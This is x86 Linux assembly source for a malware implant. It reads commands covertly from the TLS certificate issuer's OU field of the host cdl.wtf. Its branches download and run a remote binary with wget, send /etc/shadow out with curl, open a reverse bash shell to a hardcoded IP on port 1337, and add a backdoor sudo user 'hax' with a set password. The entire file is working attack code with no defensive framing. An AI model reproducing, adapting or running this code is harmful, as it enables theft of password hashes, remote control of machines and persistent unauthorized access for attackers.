segment .data
segment .bss


segment .text
	global  main

main:
push		ebp
mov		ebp, esp

mov eax, 2 ; SYS_FORK for openssl
int 0x80
cmp eax, 0
jz ssl

mov ebx,eax
xor eax,eax
xor ecx,ecx
xor edx,edx
mov al,0x07
int 0x80

; start reading
push 0x353139
push 0x3035302f
push 0x706d742f
mov ebx,esp

;open file
mov eax,5
mov ecx,0
int 0x80
mov edi,eax
mov esi,0

_fgets:
; read byte by byte
mov ebx,edi
mov eax,3
mov ecx,esp
mov edx,1
int 0x80

cmp eax,0 ; if end of file
je fgets_close

; if organizational unit field (OU)
mov ecx,esp
cmp byte [ecx],0x55
je consume
jmp _fgets

fgets_close:
mov ebx,edi ; sysclose
mov eax,6
int 0x80
cmp esi,1
je prep_dwnl
cmp esi,2
je do_exfil_passwd
cmp esi,3
je revsh
cmp esi,4
je new_user
jmp _exit

consume:
mov ebx,edi
mov eax,3
mov ecx,esp
mov edx,1
int 0x80

cmp eax,0 ; if end of file
je fgets_close

cmp byte [ecx],0x2c 	; "," end of field
je _fgets

jmp find_command

find_command:
cmp byte [ecx],0x20 ; dont consume space
je consume
cmp byte [ecx],0x3d ; dont consume =
je consume

cmp byte [ecx],0x72
je 	etc_passwd

cmp byte [ecx],0x73
je rev

cmp byte [ecx],0x64
je download

cmp byte [ecx],0x63
je uadd

; keep consuming
jmp consume

download:
mov esi,1
jmp fgets_close

etc_passwd:
mov esi,2
jmp fgets_close

rev:
mov esi,3
jmp fgets_close

uadd:
mov esi,4
jmp fgets_close


; end
mov		eax, 0
mov		esp, ebp
pop		ebp
ret

ssl:
xor eax,eax
push eax
push 0x3531
push 0x39303530
push 0x2f706d74
push 0x2f3e7475
push 0x6f6f6e2d
push 0x20726575
push 0x7373692d
push 0x20393035
push 0x78206c73
push 0x736e6570
push 0x6f7c6c6c
push 0x756e2f76
push 0x65642f3e
push 0x32203334
push 0x343a6674
push 0x772e6c64
push 0x63207463
push 0x656e6e6f
push 0x632d2074
push 0x6e65696c
push 0x635f7320
push 0x6c73736e
push 0x65706f7c
push 0x6f686365
mov ecx,esp

mov edi, ecx
xor ecx, ecx
push eax
push 0x68
push 0x7361622f
push 0x6e69622f
mov ebx, esp
; runs "echo|openssl s_client -connect cdl.wtf:443 2>/dev/null|openssl x509 -issuer -noout>/tmp/050915"
push eax
push 0x632d
mov esi,esp

push eax
push edi
push esi
push ebx
mov ecx, esp
mov al, 11
int 0x80
call _exit

prep_dwnl:
; start
mov eax, 2 ; SYS_FORK
int 0x80
cmp eax, 0
jz do_dwnl

; wait for command to finish
mov ebx,eax
xor eax,eax
xor ecx,ecx
xor edx,edx
mov al,0x07
int 0x80
jmp _exec_dwnl

_exec_dwnl:
push 0xf ; sys_chmod
pop eax
push 0x353139 ; 915
push 0x3035302f ; /050
push 0x706d742f ; /tmp
mov ebx,esp
mov	cx,511 ; a+rwx,u-w,g-rw,o-rw
int	0x80
cmp eax,0 ; chmod returns 0
jne _exit
mov eax,0
push eax
push 0x35313930
push 0x35302f2f
push 0x706d742f
mov ebx, esp
push eax
push ebx
mov ecx, esp
mov al, 11
int 0x80

_dwnl:
pop esi
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
xor edi, edi

; path to wget binary (/usr/bin/wget)
push   eax
push   0x74; t
push   0x6567772f ; /wge
push   0x6e69622f ; /bin
push   0x7273752f; /usr
mov ebx, esp

; save to tmp file /tmp/05091 (<3 mr robot)
push eax
push 0x35 ; 5
push 0x31393035; 5091
push 0x302f706d ; mp/0
push 0x742f4f2d ; -O /t
mov ecx,esp

; -q quiet flag for wget
push eax
push 0x712d ; -q
mov edi,esp

; make argv array
push eax
push ecx
push edi
push esi
push ebx
mov ecx, esp

; syscall - execve
push 0x0b
pop eax
int 0x80
call _exit

do_dwnl:
call _dwnl
binary db "http://cdl.wtf/d",0

exfil_passwd:
pop ecx
xor eax,eax
mov edi, ecx
push eax
push 0x6c ; /usr/bin/curl
push 0x7275632f
push 0x6e69622f
push 0x7273752f
mov ebx, esp

push eax
push 0x6b2d ; -k
mov esi,esp

push eax
push 0x776f6461 ; -Ff=/etc/shadow
push 0x68732f63
push 0x74652f40
push 0x3d66462d
mov edx,esp

push eax
push edx
push edi
push esi
push ebx
mov ecx, esp

cdq
mov eax, 11
int 0x80
call _exit

do_exfil_passwd:
call exfil_passwd
url db "https://cdl.wtf/x",0 ; change this to your server url

revsh:
push 0x66 ;sys_socketcall - 102
pop eax
push 0x1; sys_socket
pop ebx
cdq
push edx ; 0
push ebx ;sock_stream
push 0x2 ; af_inet
mov ecx,esp
int 0x80

push  0x148fcf12 ; ipaddr (octects in reverse order)
push word 0x3905 ; 1337
push word 0x2 ; af_inet
mov ecx,esp

push 16 ; size of the sockaddr struct
push ecx ; socket descriptor
push eax
mov ecx,esp
mov al, 0x66 ; sys_socketcall
mov bl, 0x3 ; sys_connect
int 0x80

xor ecx,ecx ; zero out ecx

; call dup2 3 times to duplicate the fd so we can connect it to the socket
duploop:
mov al,0x3f
int 0x80
inc ecx
cmp eax,3
jne duploop

mov al,0x0b
push edx
push 0x6873
push 0x61622f2f
push 0x6e69622f ; /bin/bash
mov ebx,esp
mov ecx,edx
int 0x80
call _exit



useradd:
mov eax,0
mov ebx,0
mov ecx,0
cdq
mov edi,0
mov esi,0

push eax
push 0x64
push 0x64617265 ;/usr/sbin/useradd
push 0x73752f6e
push 0x6962732f
push 0x7273752f
mov ebx,esp

push eax
push 0x3020672d
mov edx,esp

push eax
push 0x6d2d
mov esi,esp

; username
push eax
push 0x786168 ;hax
mov edi,esp

; make argv array
push eax
push edx
push esi
push edi
push ebx
mov ecx, esp

; syscall - execve
mov al,11
cdq
int 0x80
jmp _exit

new_user:
; start
mov eax, 2 ; SYS_FORK
int 0x80
cmp eax, 0
jz useradd

; wait for command to finish
mov ebx,eax
xor eax,eax
xor ecx,ecx
xor edx,edx
mov al,0x07
int 0x80
jmp new_user_privs

give_sudo:
mov eax,0
mov ebx,0
mov ecx,0
cdq
mov edi,0
mov esi,0

push eax
push 0x64
push 0x6f6d7265
push 0x73752f6e ;usermod 1
push 0x6962732f
push 0x7273752f
mov ebx,esp

push eax
push 0x47612d ; -aG 2
mov edx,esp

push eax
push 0x6f647573 ;3
mov esi,esp

; username
push eax
push 0x786168 ;hax
mov edi,esp

; make argv array
push eax
push edi
push esi
push edx
push ebx
mov ecx, esp

; syscall - execve
mov al,11
cdq
int 0x80
jmp _exit

userpw:
mov eax,0xb
cdq
push edx
push 0x6c6c756e
push 0x2f766564
push 0x2f3e3220
push 0x78616820
push 0x64777373
push 0x61707c22
push 0x6e5c3332
push 0x31786168
push 0x6e5c3332
push 0x31786168
push 0x22206674
push 0x6e697270
mov    esi,esp
push   edx
push word  0x632d
mov    ecx,esp
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp

push   edx
push   esi
push   ecx
push   ebx
mov    ecx,esp
int    0x80
call  _exit

new_user_privs:
; start
mov eax, 2 ; SYS_FORK
int 0x80
cmp eax, 0
jz give_sudo

; wait for command to finish
mov ebx,eax
xor eax,eax
xor ecx,ecx
xor edx,edx
mov al,0x07
int 0x80
jmp userpw

_exit:
mov eax,1
mov ebx,0
int 0x80
